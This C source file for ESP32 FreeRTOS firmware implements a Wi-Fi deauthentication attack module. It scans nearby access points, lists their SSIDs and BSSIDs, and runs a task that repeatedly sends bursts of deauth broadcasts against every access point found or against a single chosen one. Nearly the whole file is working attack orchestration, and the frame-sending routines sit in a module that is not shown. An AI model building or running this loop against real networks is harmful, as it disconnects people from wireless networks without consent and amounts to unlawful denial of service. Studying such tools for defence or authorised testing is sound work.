// SPDX-License-Identifier: MIT
// Copyright (c) 2026 THE POOM

#include "poom_wifi_deauth.h"

#include <stdbool.h>
#include <stdio.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "poom_wifi_scanner.h"
#include "poom_wifi_attacks.h"

#define POOM_WIFI_DEAUTH_SCAN_WAIT_MS        (2000)
#define POOM_WIFI_DEAUTH_ATTACK_BURST_COUNT  (10)
#define POOM_WIFI_DEAUTH_ATTACK_BURST_DELAY  (100)
#define POOM_WIFI_DEAUTH_AP_SWITCH_DELAY_MS  (200)
#define POOM_WIFI_DEAUTH_LOOP_DELAY_MS       (1000)

static const char *POOM_WIFI_DEAUTH_TAG = "poom_wifi_deauth";

#if CONFIG_POOM_WIFI_DEAUTH_ENABLE_LOG

    #define POOM_PRINTF_E(fmt, ...) \
        printf("[E] [%s] %s:%d: " fmt "\n", POOM_WIFI_DEAUTH_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #define POOM_PRINTF_W(fmt, ...) \
        printf("[W] [%s] %s:%d: " fmt "\n", POOM_WIFI_DEAUTH_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #define POOM_PRINTF_I(fmt, ...) \
        printf("[I] [%s] %s:%d: " fmt "\n", POOM_WIFI_DEAUTH_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #define POOM_PRINTF_D(fmt, ...) \
        printf("[D] [%s] %s:%d: " fmt "\n", POOM_WIFI_DEAUTH_TAG, __func__, __LINE__, ##__VA_ARGS__)

#else

    #define POOM_PRINTF_E(...)
    #define POOM_PRINTF_W(...)
    #define POOM_PRINTF_I(...)
    #define POOM_PRINTF_D(...)

#endif

static TaskHandle_t s_poom_wifi_deauth_task_handle = NULL;
static bool s_poom_wifi_deauth_running = false;

/**
 * @brief Prints the AP scan table in console format.
 * @param[in] records Cached AP records list.
 * @return void
 */
static void poom_wifi_deauth_print_scan_results_(const poom_wifi_scanner_ap_records_t *records)
{
    int index;

    if((records == NULL) || (records->count == 0))
    {
        POOM_PRINTF_W("No access points found");
        return;
    }

    printf("\n==== Wi-Fi AP Scan Results ====\n");

    for(index = 0; index < records->count; index++)
    {
        const wifi_ap_record_t *ap = &records->records[index];

        printf("[%02d] SSID: %-32s RSSI: %3d dBm CH: %2d BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
               index,
               ap->ssid,
               ap->rssi,
               ap->primary,
               ap->bssid[0],
               ap->bssid[1],
               ap->bssid[2],
               ap->bssid[3],
               ap->bssid[4],
               ap->bssid[5]);
    }

    printf("===============================\n");
}

/**
 * @brief Executes continuous scan and deauth broadcast loop.
 * @param[in,out] task_arg Task argument (unused).
 * @return void
 */
static void poom_wifi_deauth_attack_loop_task_(void *task_arg)
{
    (void)task_arg;

    while(s_poom_wifi_deauth_running)
    {
        poom_wifi_scanner_ap_records_t *records;
        int ap_index;

        (void)poom_wifi_scanner_clear_ap_records();
        (void)poom_wifi_scanner_scan();
        vTaskDelay(pdMS_TO_TICKS(POOM_WIFI_DEAUTH_SCAN_WAIT_MS));

        records = poom_wifi_scanner_get_ap_records();
        if((records == NULL) || (records->count == 0))
        {
            POOM_PRINTF_W("No targets available, retrying scan");
            vTaskDelay(pdMS_TO_TICKS(POOM_WIFI_DEAUTH_SCAN_WAIT_MS));
            continue;
        }

        for(ap_index = 0; (ap_index < records->count) && s_poom_wifi_deauth_running; ap_index++)
        {
            wifi_ap_record_t *target = &records->records[ap_index];
            int burst_index;

            POOM_PRINTF_I("Attacking target [%d]: %s", ap_index, target->ssid);

            for(burst_index = 0;
                (burst_index < POOM_WIFI_DEAUTH_ATTACK_BURST_COUNT) && s_poom_wifi_deauth_running;
                burst_index++)
            {
                poom_wifi_attacks_broadcast_once(target);
                vTaskDelay(pdMS_TO_TICKS(POOM_WIFI_DEAUTH_ATTACK_BURST_DELAY));
            }

            vTaskDelay(pdMS_TO_TICKS(POOM_WIFI_DEAUTH_AP_SWITCH_DELAY_MS));
        }

        POOM_PRINTF_I("Attack cycle completed");
        vTaskDelay(pdMS_TO_TICKS(POOM_WIFI_DEAUTH_LOOP_DELAY_MS));
    }

    s_poom_wifi_deauth_task_handle = NULL;
    vTaskDelete(NULL);
}

/**
 * @brief Scans nearby APs and prints them to console.
 * @param[in,out] none Not used.
 * @return esp_err_t
 */
esp_err_t poom_wifi_deauth_scan_and_list(void)
{
    poom_wifi_scanner_ap_records_t *records;

    (void)poom_wifi_scanner_clear_ap_records();

    POOM_PRINTF_I("Starting AP scan");
    (void)poom_wifi_scanner_scan();
    vTaskDelay(pdMS_TO_TICKS(POOM_WIFI_DEAUTH_SCAN_WAIT_MS));

    records = poom_wifi_scanner_get_ap_records();
    poom_wifi_deauth_print_scan_results_(records);

    return ESP_OK;
}

/**
 * @brief Sends one deauth broadcast attack against a selected AP index.
 * @param[in] index AP index from scanner cache.
 * @return esp_err_t
 */
esp_err_t poom_wifi_deauth_attack(int index)
{
    wifi_ap_record_t *target = poom_wifi_scanner_get_ap_record((unsigned)index);

    if(target == NULL)
    {
        POOM_PRINTF_E("Invalid AP index: %d", index);
        return ESP_ERR_NOT_FOUND;
    }

    POOM_PRINTF_W("Launching deauth broadcast against: %s", target->ssid);
    poom_wifi_attacks_handle(poom_wifi_attacks_type_broadcast, target);
    return ESP_OK;
}

/**
 * @brief Stops the running deauth loop and attack module.
 * @param[in,out] none Not used.
 * @return esp_err_t
 */
esp_err_t poom_wifi_deauth_stop(void)
{
    s_poom_wifi_deauth_running = false;
    poom_wifi_attacks_stop();
    POOM_PRINTF_I("Deauth attack loop stopped");
    return ESP_OK;
}

/**
 * @brief Starts the deauth scan/attack loop task.
 * @param[in,out] none Not used.
 * @return esp_err_t
 */
esp_err_t poom_wifi_deauth_start(void)
{
    if(s_poom_wifi_deauth_task_handle != NULL)
    {
        POOM_PRINTF_W("Deauth task already running");
        return ESP_OK;
    }

    s_poom_wifi_deauth_running = true;

    if(xTaskCreate(poom_wifi_deauth_attack_loop_task_,
                   "poom_deauth",
                   4096,
                   NULL,
                   5,
                   &s_poom_wifi_deauth_task_handle) != pdPASS)
    {
        s_poom_wifi_deauth_running = false;
        s_poom_wifi_deauth_task_handle = NULL;
        POOM_PRINTF_E("Failed to create deauth task");
        return ESP_FAIL;
    }

    POOM_PRINTF_I("Deauth task started");
    return ESP_OK;
}

/**
 * @brief Reports whether the deauth loop is currently running.
 * @param[in,out] none Not used.
 * @return bool
 */
bool poom_wifi_deauth_is_running(void)
{
    return s_poom_wifi_deauth_running;
}
